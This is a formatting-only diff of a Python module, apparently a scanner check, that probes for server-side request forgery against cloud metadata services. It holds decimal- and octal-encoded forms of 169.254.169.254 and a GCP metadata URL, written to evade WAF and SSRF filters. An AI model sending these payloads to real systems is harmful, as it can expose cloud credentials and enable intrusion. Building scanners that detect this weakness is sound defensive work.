@@ -45,7 +45,9 @@ def run(target: str, ip: str, ports: list[int], banners: dict[str, str]) -> dict
     # Deterministic IMDS evasion payloads (AWS, GCP, Azure)
     # Using Decimal and Octal encodings to evade WAF/SSRF filters
     payloads = [
-        {"url": "http://2852039166/latest/meta-data/"},  # Decimal encoding for 169.254.169.254
+        {
+            "url": "http://2852039166/latest/meta-data/"
+        },  # Decimal encoding for 169.254.169.254
         {"url": "http://0251.0376.0251.0376/latest/meta-data/"},  # Octal encoding
         {"url": "http://169.254.169.254/computeMetadata/v1/"},  # GCP
     ]
@@ -95,7 +97,10 @@ def run(target: str, ip: str, ports: list[int], banners: dict[str, str]) -> dict
 
                     # Analisando a resposta do Cloud Metadata
                     if "200 OK" in response_str:
-                        if re.search(r"ami-[0-9a-f]{8,17}", response_str) or "computeMetadata" in response_str:
+                        if (
+                            re.search(r"ami-[0-9a-f]{8,17}", response_str)
+                            or "computeMetadata" in response_str
+                        ):
                             return {
                                 "vulnerability": vulnerability,
                                 "severity": severity,
